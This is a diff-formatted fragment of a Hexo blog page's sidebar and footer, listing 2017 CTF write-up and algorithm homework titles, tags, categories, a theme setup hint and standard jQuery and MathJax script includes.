+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/en/2017-SECCON-Write-up/" >2017::SECCON::Write-up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework3/" >Advance-Algorithm::homework3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework2/" >Advance-Algorithm::homework2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href= "/en/Advance-Algorithm-homework1/" >Advance-Algorithm::homework1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/en/2017-HITCON-Quals-Sakura-English/" >2017::HITCON-Quals::Sakura::English</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/tw/2017-HITCON-qual-Sakura/" >2017::HITCON-qual::Sakura</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/tw/Reversing-kr-write-up-1/" >Reversing.kr #1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href= "/tw/2017-AIS3-pre-exam-write-up/" >AIS3 pre-exam write up</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="HITCON"><span class="iconfont-archer">&#xe606;</span>HITCON</span>
+    
+        <span class="sidebar-tag-name" data-tags="SECCON"><span class="iconfont-archer">&#xe606;</span>SECCON</span>
+    
+        <span class="sidebar-tag-name" data-tags="0CTF"><span class="iconfont-archer">&#xe606;</span>0CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ASIS"><span class="iconfont-archer">&#xe606;</span>ASIS</span>
+    
+        <span class="sidebar-tag-name" data-tags="RealWorldCTF"><span class="iconfont-archer">&#xe606;</span>RealWorldCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="CONFidence"><span class="iconfont-archer">&#xe606;</span>CONFidence</span>
+    
+        <span class="sidebar-tag-name" data-tags="Flare-On"><span class="iconfont-archer">&#xe606;</span>Flare-On</span>
+    
+        <span class="sidebar-tag-name" data-tags="Plaid"><span class="iconfont-archer">&#xe606;</span>Plaid</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pragyan"><span class="iconfont-archer">&#xe606;</span>Pragyan</span>
+    
+        <span class="sidebar-tag-name" data-tags="AFL++"><span class="iconfont-archer">&#xe606;</span>AFL++</span>
+    
+        <span class="sidebar-tag-name" data-tags="QEMU"><span class="iconfont-archer">&#xe606;</span>QEMU</span>
+    
+        <span class="sidebar-tag-name" data-tags="Balsn"><span class="iconfont-archer">&#xe606;</span>Balsn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
+    
+        <span class="sidebar-tag-name" data-tags="AIS3"><span class="iconfont-archer">&#xe606;</span>AIS3</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reversing-kr"><span class="iconfont-archer">&#xe606;</span>Reversing-kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cryptography"><span class="iconfont-archer">&#xe606;</span>Cryptography</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="OSCP"><span class="iconfont-archer">&#xe606;</span>OSCP</span>
+    
+        <span class="sidebar-tag-name" data-tags="OS"><span class="iconfont-archer">&#xe606;</span>OS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Base64"><span class="iconfont-archer">&#xe606;</span>Base64</span>
+    
+        <span class="sidebar-tag-name" data-tags="AVX"><span class="iconfont-archer">&#xe606;</span>AVX</span>
+    
+        <span class="sidebar-tag-name" data-tags="FaceBook"><span class="iconfont-archer">&#xe606;</span>FaceBook</span>
+    
+        <span class="sidebar-tag-name" data-tags="GIF"><span class="iconfont-archer">&#xe606;</span>GIF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Windows"><span class="iconfont-archer">&#xe606;</span>Windows</span>
+    
+        <span class="sidebar-tag-name" data-tags="browser"><span class="iconfont-archer">&#xe606;</span>browser</span>
+    
+        <span class="sidebar-tag-name" data-tags="Chakra"><span class="iconfont-archer">&#xe606;</span>Chakra</span>
+    
+        <span class="sidebar-tag-name" data-tags="JIT"><span class="iconfont-archer">&#xe606;</span>JIT</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="WriteUp"><span class="iconfont-archer">&#xe60a;</span>WriteUp</span>
+    
+        <span class="sidebar-category-name" data-categories="Record"><span class="iconfont-archer">&#xe60a;</span>Record</span>
+    
+        <span class="sidebar-category-name" data-categories="Reminder"><span class="iconfont-archer">&#xe60a;</span>Reminder</span>
+    
+        <span class="sidebar-category-name" data-categories="Note"><span class="iconfont-archer">&#xe60a;</span>Note</span>
+    
+        <span class="sidebar-category-name" data-categories="TodayILearn"><span class="iconfont-archer">&#xe60a;</span>TodayILearn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Terrynini"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>
+    
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
+
+
